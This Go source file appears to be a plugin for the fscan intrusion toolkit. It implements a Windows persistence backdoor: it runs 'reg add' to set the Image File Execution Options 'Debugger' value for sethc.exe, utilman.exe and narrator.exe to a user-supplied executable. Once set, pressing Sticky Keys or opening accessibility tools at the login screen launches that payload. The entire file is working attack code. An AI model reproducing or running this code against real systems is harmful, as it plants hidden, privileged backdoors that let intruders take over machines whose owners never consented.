//go:build (plugin_winifeo || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

type WinIFEOPlugin struct {
	plugins.BasePlugin
}

func NewWinIFEOPlugin() *WinIFEOPlugin {
	return &WinIFEOPlugin{BasePlugin: plugins.NewBasePlugin("winifeo")}
}

func (p *WinIFEOPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	pePath := session.Config.WinPEFile
	if pePath == "" {
		return &plugins.Result{Success: false, Error: fmt.Errorf("%s", i18n.GetText("local_pe_not_specified"))}
	}
	if _, err := os.Stat(pePath); err != nil {
		return &plugins.Result{Success: false, Error: fmt.Errorf("%s", i18n.Tr("local_pe_not_found", pePath))}
	}

	absPath, _ := filepath.Abs(pePath)

	// 劫持目标：不常用但系统存在的程序
	targets := []struct {
		exe  string
		desc string
	}{
		{"sethc.exe", i18n.GetText("winifeo_sticky_keys")},
		{"utilman.exe", i18n.GetText("winifeo_accessibility")},
		{"narrator.exe", i18n.GetText("winifeo_narrator")},
	}

	var output strings.Builder
	var successCount int

	for _, t := range targets {
		key := fmt.Sprintf(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s`, t.exe)
		out, err := exec.Command("reg", "add", key, "/v", "Debugger", "/t", "REG_SZ", "/d", absPath, "/f").CombinedOutput()
		if err != nil {
			output.WriteString(i18n.Tr("local_step_failed", t.desc, strings.TrimSpace(string(out))) + "\n")
			continue
		}
		output.WriteString(i18n.Tr("local_step_success_detail", t.desc, t.exe) + "\n")
		successCount++
	}

	if successCount > 0 {
		common.LogSuccess(i18n.Tr("winifeo_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func init() {
	RegisterLocalPlugin("winifeo", func() Plugin {
		return NewWinIFEOPlugin()
	})
}
